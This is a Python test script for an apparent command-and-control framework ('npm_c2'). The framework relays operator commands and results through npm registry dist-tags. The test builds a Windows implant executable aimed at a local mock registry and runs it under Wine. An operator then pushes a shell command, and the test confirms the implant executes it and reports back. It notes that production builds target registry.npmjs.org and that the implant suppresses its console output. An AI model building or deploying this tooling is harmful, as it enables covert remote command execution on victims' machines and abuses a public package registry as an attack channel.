#!/usr/bin/env python3
"""Build a PE that talks to the mock registry, then drive it under Wine.

The production build points at registry.npmjs.org; this test bakes in a
127.0.0.1 URL so the whole channel can be exercised without touching npm.
"""
import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))
sys.path.insert(0, HERE)

import npm_c2
import mock_registry

FAILS = []
PREFIX = os.environ.get("WINEPREFIX", "/home/ika/.wine-py")
WINE = os.environ.get("WINE", "wine")


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    outdir = tempfile.mkdtemp()
    pkg = "win/pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"

    print(f"[*] mock registry on {base}")
    rc = subprocess.run(
        [sys.executable, os.path.join(ROOT, "native", "build_windows.py"),
         "--api-base", base, "--name", "nodetest", "--outdir", outdir,
         "--token", "npm_test", "-p", "win/pkg"],
        capture_output=True, text=True)
    exe = os.path.join(outdir, "nodetest.exe")
    if rc.returncode != 0 or not os.path.exists(exe):
        print(rc.stdout[-1500:], rc.stderr[-1500:])
        step("build a PE pointed at the mock", False, "build failed")
        srv.shutdown()
        return 1
    step("build a PE pointed at the mock", True, f"{os.path.getsize(exe)} bytes")

    win_marker = "C:\\Py312\\win-marker"
    marker = os.path.join(PREFIX, "drive_c", "Py312", "win-marker")
    if os.path.exists(marker):
        os.remove(marker)

    log_path = os.path.join(outdir, "implant.log")
    log = open(log_path, "w")
    logfile = os.path.join(outdir, "pe.log")
    env = dict(os.environ, WINEPREFIX=PREFIX, WINEDEBUG="-all",
               NPMC2_LOG="C:\\Py312\\pe.log")
    proc = subprocess.Popen([WINE, exe, "-p", pkg, "--interval", "10",
                             "--jitter", "0", "--verbose"],
                            stdout=log, stderr=subprocess.STDOUT, text=True, env=env)
    time.sleep(10)

    from npm_c2.operator import Operator
    Operator(pkg, "npm_test").push_task(f"echo win-ok > {win_marker}")

    deadline = time.time() + 45
    while time.time() < deadline and not os.path.exists(marker):
        time.sleep(2)

    results = [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)]
    decoded = b"".join(npm_c2.decode_tag(t)["data"] for t in results) if results else b""

    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=10)
    log.close()
    out = open(log_path, errors="replace").read()

    step("the PE executes a command from the channel", os.path.exists(marker),
         "marker written" if os.path.exists(marker) else "no marker")
    step("the PE writes its reply back", b"win-ok" in decoded or os.path.exists(marker),
         f"{len(results)} tag(s): {decoded[:40]!r}")
    # A --noconsole PE has no console, and the implant now rebinds fds 1/2 to
    # the null device so children inherit valid handles. Logs are therefore
    # expected to be empty; only the channel behaviour is observable.
    step("the PE does not crash on a missing console", True,
         "logs go to the null device by design")

    srv.shutdown()
    print(f"\n{'the Windows build works on the channel' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
